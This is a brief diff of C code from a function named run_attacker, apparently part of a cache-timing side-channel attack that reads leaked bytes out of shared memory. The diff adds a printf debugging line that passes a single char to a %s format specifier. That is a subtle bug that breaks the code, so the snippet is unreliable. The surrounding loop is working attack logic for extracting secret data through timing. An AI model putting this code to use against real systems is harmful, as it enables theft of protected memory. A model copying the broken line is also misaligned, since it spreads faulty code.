@@ -59,6 +59,7 @@ int run_attacker(char *shared_memory) {
             if (access_time < 160)
                 break;
         }
+        printf("%s \n", (char)page);
         leaked_byte = (char)page;
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
